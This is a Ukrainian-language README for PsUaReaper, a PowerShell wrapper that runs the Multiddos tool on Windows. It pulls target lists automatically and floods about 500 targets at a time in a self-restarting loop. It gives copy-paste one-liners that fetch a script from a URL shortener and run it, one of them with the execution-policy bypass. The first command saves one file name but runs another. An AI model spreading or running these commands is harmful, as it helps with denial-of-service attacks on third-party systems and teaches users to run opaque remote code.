# PsUaReaper
PowerShell-враппер для запуску Multiddos на Windows. 
- Не потребує інсталяції додатковий програм, все необхідне розташовується в C:\PsUaReaper
- Не потребує адміністративних прав для запуску
- Сумісніть з Windows 7 SP1
- Автоматичне оновлення цілей

Джерела натхнення:
[KarboDuck](https://github.com/KarboDuck)
[ahovdryk](https://github.com/ahovdryk)

## Перший старт:
1. Найлегший шлях для старих систем (Windows 7, 8, 8.1, 10 до білда 1803):
- Завантажити з офіційного репозиторію останню версію [PowerShell](https://github.com/PowerShell/PowerShell/releases/download/v7.2.4/PowerShell-7.2.4-win-x86.zip)
- Розпакувати архів в будь який каталог і запустити з нього <code>pwsh.exe</code>
- Виконати команду:
```
(new-object System.Net.WebClient).DownloadFile("https://tiny.one/jxr7yadn", "$env:tmp\setup.ps1"); &"$env:tmp\Setup1.ps1";ri "$env:tmp\Setup.ps1"
```
2. Windows 10 білд 1803 і новіше:
- Скопіювати команду
```
cmd.exe /c curl -L https://tiny.one/jxr7yadn -o setup.ps1 && powershell -executionpolicy bypass -file setup.ps1 && del setup.ps1
```
- Натиснути Win+R
- Вставити команду і натиснути Enter

## Важливі зауваження
(!) Наступні запуски можливі з файлу C:\PsUaReaper\Start.cmd</br>
(!) При старті відбувається пошук цілей зі списку KarboDuck</br>
(!) Скрипт працює тільки з унікальними цілям</br>
(!) Перевіряється оновлення PowerShell i Python скриптів</br>
(!) Список цілей розбивається на групи по 500 (+/-) і навантажується почергово протягом 10 хвилин</br>
(!) По завершенню циклу, скрипт зам себе перезапускає</br>
(!) Для завершення необхідно натиснути Ctrl+C</br>
